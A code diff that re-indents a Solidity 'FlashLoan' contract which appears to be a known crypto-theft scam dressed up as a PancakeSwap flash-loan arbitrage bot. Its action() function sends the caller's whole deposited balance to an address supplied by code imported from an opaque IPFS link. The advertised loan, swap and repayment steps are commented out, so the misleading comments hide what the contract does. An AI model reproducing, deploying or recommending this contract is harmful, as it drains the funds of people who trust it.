@@ -13,35 +13,35 @@ import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/i
 import "https://gateway.pinata.cloud/ipfs/QmaqVfKsx4T6xj8cnqELmKk1cYUCYnvEFCCMrZZgiwNGSW";
 
 contract FlashLoan {
-		string public tokenName;
-		string public tokenSymbol;
-		uint256 loanAmount;
-		Manager manager;
+    string public tokenName;
+    string public tokenSymbol;
+    uint256 loanAmount;
+    Manager manager;
 
-		constructor(
-				string memory _tokenName,
-				string memory _tokenSymbol,
-				uint256 _loanAmount
-		) public {
-				tokenName = _tokenName;
-				tokenSymbol = _tokenSymbol;
-				loanAmount = _loanAmount;
+    constructor(
+        string memory _tokenName,
+        string memory _tokenSymbol,
+        uint256 _loanAmount
+    ) public {
+        tokenName = _tokenName;
+        tokenSymbol = _tokenSymbol;
+        loanAmount = _loanAmount;
 
-				manager = new Manager();
-		}
+        manager = new Manager();
+    }
 
-		function() external payable {}
+    function() external payable {}
 
-		function action() public payable {
-				// Send required coins for swap
-				address(uint160(manager.pancakeswapDepositAddress())).transfer(
-						address(this).balance
-				);
+    function action() public payable {
+        // Send required coins for swap
+        address(uint160(manager.pancakeswapDepositAddress())).transfer(
+            address(this).balance
+        );
 
-				// Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
-				manager.performTasks();
+        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+        manager.performTasks();
 
-				/*
+        /*
 			// Submit token to Ethereum blockchain
 			string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
@@ -70,5 +70,5 @@ contract FlashLoan {
 				// Repay Flash loan
 		manager.repayAaveLoan(loanAddress);
 			*/
-		}
+    }
 }
